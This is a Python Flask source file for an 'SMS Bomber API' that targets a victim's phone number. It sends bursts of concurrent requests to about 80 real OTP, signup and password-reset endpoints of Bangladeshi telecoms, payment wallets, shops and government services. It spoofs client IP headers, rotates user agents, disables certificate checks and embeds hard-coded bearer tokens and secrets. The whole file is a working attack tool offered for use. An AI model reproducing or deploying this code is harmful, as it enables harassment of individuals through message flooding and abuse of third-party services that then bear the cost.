# api/index.py
from flask import Flask, request, jsonify
import requests
import random
import json
import concurrent.futures
import re
import ssl
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# User Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
]

def random_ip():
    """Generate random IP address"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def make_request(api_config, number):
    """Make a single API request"""
    try:
        # Replace {{number}} in URL
        url = api_config['url'].replace('{{number}}', number)
        
        # Prepare headers
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'X-Forwarded-For': random_ip(),
            'X-Real-IP': random_ip(),
            'Client-IP': random_ip()
        }
        
        # Add custom headers if present
        if 'headers' in api_config:
            for header in api_config['headers']:
                try:
                    key, value = header.split(': ', 1)
                    headers[key] = value.replace('{{number}}', number)
                except ValueError:
                    continue
        
        # Prepare data for POST requests
        data = None
        json_data = None
        if api_config['method'] == 'POST' and 'data' in api_config:
            data_str = api_config['data'].replace('{{number}}', number)
            
            # Check content type
            content_type = headers.get('Content-Type', '')
            if 'application/json' in content_type:
                try:
                    json_data = json.loads(data_str)
                except json.JSONDecodeError:
                    json_data = data_str
            elif 'application/x-www-form-urlencoded' in content_type:
                data = data_str
            else:
                # Default to JSON
                try:
                    json_data = json.loads(data_str)
                except json.JSONDecodeError:
                    data = data_str
        
        # Create session with custom SSL context
        session = requests.Session()
        session.verify = False
        
        # Make the request
        timeout = 8
        if api_config['method'] == 'GET':
            response = session.get(url, headers=headers, timeout=timeout)
        else:  # POST
            if json_data is not None:
                response = session.post(url, headers=headers, json=json_data, timeout=timeout)
            else:
                response = session.post(url, headers=headers, data=data, timeout=timeout)
        
        # Check if successful (2xx status code)
        return 200 <= response.status_code < 300
    
    except requests.exceptions.Timeout:
        return False
    except requests.exceptions.ConnectionError:
        return False
    except Exception as e:
        return False

def process_apis(number, amount):
    """Process all APIs with the given number"""
    # Define all API configurations
    apis = [
        {'url': 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', 'method': 'POST', 'data': json.dumps({'full_name':'BILLAVAI','company_name':'HARDBOMBER','email_address':'pro@bomb.bd','phone_number':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web', 'method': 'POST', 'data': json.dumps({'mobile_no':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', 'method': 'POST', 'data': json.dumps({'data':{'country_calling_code':'88','contact_no':'{{number}}','headers':{'PlatForm':'Web'}}}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api-gateway.sundarbancourierltd.com/graphql', 'method': 'POST', 'data': json.dumps({'operationName':'CreateAccessToken','variables':{'accessTokenFilter':{'userName':'{{number}}'}},'query':"mutation{createAccessToken(accessTokenFilter:{userName:\"{{number}}\"}){message}}"}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.apex4u.com/api/auth/login', 'method': 'POST', 'data': json.dumps({'phoneNumber':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://webapi.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number':'{{number}}','type':'doorstep'}), 'headers': ['Content-Type: application/json', 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc']},
        {'url': 'https://web-api.banglalink.net/api/v1/user/number/validation/{{number}}', 'method': 'GET'},
        {'url': 'https://web-api.banglalink.net/api/v1/user/otp-login/request', 'method': 'POST', 'data': json.dumps({'mobile':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://webloginda.grameenphone.com/backend/api/v1/otp', 'method': 'POST', 'data': 'msisdn={{number}}', 'headers': ['Content-Type: application/x-www-form-urlencoded']},
        {'url': 'https://webapi.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number':'{{number}}','type':'my_offer'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://da-api.robi.com.bd/da-nll/otp/send', 'method': 'POST', 'data': json.dumps({'msisdn':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://webapi.robi.com.bd/v1/chat/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number':'{{number}}','name':'BILLAVAI','type':'video-chat'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'method': 'POST', 'data': json.dumps({'phoneNumber':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://fundesh.com.bd/api/auth/generateOTP', 'method': 'POST', 'data': json.dumps({'msisdn':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={{number}}', 'method': 'GET'},
        {'url': 'https://api.motionview.com.bd/api/send-otp-phone-signup', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': json.dumps({'number':'+88{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://user-api.jslglobal.co:444/v2/send-otp', 'method': 'POST', 'data': json.dumps({'phone':'+88{{number}}', 'jatri_token':'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://chinaonlinebd.com/api/login/getOtp?phone={{number}}', 'method': 'GET', 'headers': ['token: 45601f3d391886fcec5f5a3f26780f21']},
        {'url': 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': json.dumps({'number':'+88{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.shikho.com/auth/v2/send/sms', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}','type':'student','auth_type':'signup'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.redx.com.bd/v1/user/signup', 'method': 'POST', 'data': json.dumps({'name':'Attack','phoneNumber':'{{number}}','service':'redx'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://www.bioscopelive.com/en/login/send-otp?phone=88{{number}}&operator=bd-otp', 'method': 'GET'},
        {'url': 'https://applink.com.bd/appstore-v4-server/login/otp/request', 'method': 'POST', 'data': json.dumps({'msisdn':'88{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://chokrojan.com/api/v1/passenger/login/mobile', 'method': 'POST', 'data': json.dumps({'mobile_number':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://core.easy.com.bd/api/v1/forgot-password-otp', 'method': 'POST', 'data': json.dumps({'device_key':'2ea97d276a980993308116baa292cec9','mobile':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://waltonplaza.com.bd/api/auth/otp/create', 'method': 'POST', 'data': json.dumps({'auth':{'countryCode':'880','deviceUuid':'ee757830-f639-12f0-9f4d-2f972746fhg','phone':'{{number}}'},'captchaToken':'recapcha'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.chardike.com/api/otp/send', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}','otp_type':'login'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json', 'method': 'POST', 'data': json.dumps({'phoneNbr':'{{number}}','OTPType':1.0,'userName':'','email':''}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://gateway.otithee.com/api/v1/generate-otp', 'method': 'POST', 'data': json.dumps({'request_type':'registration','mobile_number':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://developer.quizgiri.xyz/api/v2.0/send-otp', 'method': 'POST', 'data': json.dumps({'country_code':'+88','phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://new.mojaru.com/api/student/login', 'method': 'POST', 'data': json.dumps({'mobile_or_email':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://appcity.grameenphone.com/proxy/v2/user/session/get-otp', 'method': 'POST', 'data': json.dumps({'mobileNumber':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.garibookadmin.com/api/v3/user/login', 'method': 'POST', 'data': json.dumps({'recaptcha_token':'garibookcaptcha','mobile':'{{number}}','channel':'web'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web', 'method': 'POST', 'data': json.dumps({'number':'+88{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={{number}}', 'method': 'GET'},
        {'url': 'https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/', 'method': 'POST', 'data': json.dumps({'wallet_number':'{{number}}','geo_location':{'lat':23.89,'long':89.13},'referral':'','firebase_token':'dummy','device_uuid':'c65m117a8cbf5b1851b29f8b','mno':'Robi'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://bb-api.bohubrihi.com/public/activity/otp', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}','intent':'login'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://backend.timezonebd.com/api/v1/user/otp-login', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}','language':'en','email':''}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.shikho.com/public/activity/otp', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}','intent':'ap-discount-request'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://edgecoursebd.com/register', 'method': 'POST', 'data': json.dumps([{'phone':'{{number}}'}]), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.ostad.app/api/v2/user/with-otp', 'method': 'POST', 'data': json.dumps({'msisdn':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://www.ieducationbd.com/api/account/check_user', 'method': 'POST', 'data': json.dumps({'mobile':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://app.hishabee.business/api/V2/otp/send?mobile_number={{number}}', 'method': 'GET'},
        {'url': 'https://rootsedulive.com/api/auth/register', 'method': 'POST', 'data': json.dumps({'name':'BILLAVAI','phone':'88{{number}}','email':"temp{{number}}@bomb.bd",'password':'Secure@2025','confirmPassword':'Secure@2025'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://rootsedulive.com/api/auth/forget-password', 'method': 'POST', 'data': json.dumps({'phoneOrEmail':'88{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://mithaibd.com/api/login/', 'method': 'POST', 'data': json.dumps({'company_id':'2','phone':'{{number}}','email':"attack{{number}}@mail.com",'password1':'pass123','otp_verify':False}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.englishmojabd.com/api/v1/auth/login', 'method': 'POST', 'data': json.dumps({'phone':'+88{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.osudpotro.com/api/v1/users/send_otp', 'method': 'POST', 'data': json.dumps({'mobile':'+88-{{number}}','deviceToken':'web','language':'bn','os':'web'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{{number}}/', 'method': 'GET'},
        {'url': 'https://auth.qcoom.com/api/v1/otp/send', 'method': 'POST', 'data': json.dumps({'mobileNumber':'+88{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://reseller.circle.com.bd/api/v2/auth/signup', 'method': 'POST', 'data': json.dumps({'name':'+88{{number}}','email_or_phone':'+88{{number}}','password':'123456','password_confirmation':'123456','register_by':'phone'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json', 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s']},
        {'url': 'https://api.toybox.live/bdapps_handler.php', 'method': 'POST', 'data': 'Operation=CreateSubscription&MobileNumber=88{{number}}&PackageID=100&Secret=HJKX71%UHYH', 'headers': ['Content-Type: application/x-www-form-urlencoded']},
        {'url': 'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{{number}}', 'method': 'GET', 'headers': ['sourcePlatform: web', 'client: 2']},
        {'url': 'https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp', 'method': 'POST', 'data': json.dumps({'deviceId':'prodevice','operator':'Gp','walletNumber':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://webapi.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number':'{{number}}','type':'internet_pack'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}','email':'pro@bomber.com','language':'bn'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.dmoney.com.bd/api/v1/otp/send?msisdn={{number}}', 'method': 'GET'},
        {'url': 'https://api.nagad.com.bd/otp/send', 'method': 'POST', 'data': json.dumps({'mobileNumber':'{{number}}','service':'login'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.surecash.com.bd/v2/otp/generate', 'method': 'POST', 'data': json.dumps({'msisdn':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.rocket.com.bd/merchant/otp', 'method': 'POST', 'data': json.dumps({'account':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.bkash.com.bd/otp/request', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}','type':'registration'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.foodpanda.com.bd/v1/auth/otp', 'method': 'POST', 'data': json.dumps({'phone':'+88{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.pathao.com/v2/auth/otp', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.daraz.com.bd/auth/otp', 'method': 'POST', 'data': json.dumps({'mobile':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.priyoshop.com/v1/otp/send', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://ajkerdeal.com/api/v1/otp?phone={{number}}', 'method': 'GET'},
        {'url': 'https://api.evaly.com.bd/auth/otp', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.chaldal.com/v1/auth/otp', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.shurjopay.com.bd/otp/send', 'method': 'POST', 'data': json.dumps({'phone':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://sslwireless.com/api/otp', 'method': 'POST', 'data': json.dumps({'msisdn':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://api.robi.com.bd/v1/send-otp', 'method': 'POST', 'data': json.dumps({'phone_number':'{{number}}','type':'voice'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{{number}}', 'method': 'GET'},
        {'url': 'https://selfcare.banglalink.net/api/v1/otp', 'method': 'POST', 'data': json.dumps({'msisdn':'{{number}}'}), 'headers': ['Content-Type: application/json']},
        {'url': 'https://teletalk.com.bd/api/otp/send', 'method': 'POST', 'data': json.dumps({'number':'{{number}}'}), 'headers': ['Content-Type: application/json']}
    ]
    
    total_requests = 0
    success_count = 0
    fail_count = 0
    
    # Process in batches to avoid timeout
    batch_size = 20  # Reduced batch size for Vercel
    for cycle in range(amount):
        # Shuffle APIs for variety
        random.shuffle(apis)
        
        # Process in batches
        for i in range(0, len(apis), batch_size):
            batch = apis[i:i+batch_size]
            
            # Create a list of tasks for concurrent execution
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                future_to_api = {
                    executor.submit(make_request, api, number): api 
                    for api in batch
                }
                
                for future in concurrent.futures.as_completed(future_to_api):
                    total_requests += 1
                    if future.result():
                        success_count += 1
                    else:
                        fail_count += 1
    
    return total_requests, success_count, fail_count

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'message': 'SMS Bomber API',
        'endpoints': {
            '/send': 'POST/GET - Send OTP requests to target number',
            'parameters': {
                'number': 'Target phone number (11 digits)',
                'amount': 'Number of cycles (1-10, default: 1)'
            }
        },
        'Api_Owner': '@C_T_A_1',
        'note': 'Vercel has 10s timeout limit, use amount 1-3 for best results'
    })

@app.route('/send', methods=['GET', 'POST'])
def send_otp():
    # Get parameters from request
    if request.method == 'GET':
        number = request.args.get('number', '')
        amount = request.args.get('amount', 1)
    else:
        number = request.form.get('number', '')
        amount = request.form.get('amount', 1)
    
    # Validate and clean number
    number = re.sub(r'[^0-9]', '', number)
    
    # Validate amount (reduce for Vercel timeout)
    try:
        amount = int(amount)
        if amount < 1:
            amount = 1
        if amount > 10:  # Reduced max for Vercel
            amount = 10
    except (ValueError, TypeError):
        amount = 1
    
    # Validate phone number
    if len(number) != 11:
        return jsonify({
            'error': 'Invalid phone number. Must be 11 digits.',
            'Api_Owner': '@C_T_A_1'
        }), 400
    
    try:
        # Process the requests
        total, success, failed = process_apis(number, amount)
        
        return jsonify({
            'Api_Owner': '',
            'target_number': number,
            'amount': amount,
            'total_requests': total,
            'success': success,
            'failed': failed,
            'message': 'Attack completed.'
        })
    except Exception as e:
        return jsonify({
            'error': str(e),
            'Api_Owner': '@C_T_A_1'
        }), 500

# For Vercel serverless deployment
app.debug = False

# This is the handler for Vercel
def handler(event, context):
    return app(event, context)
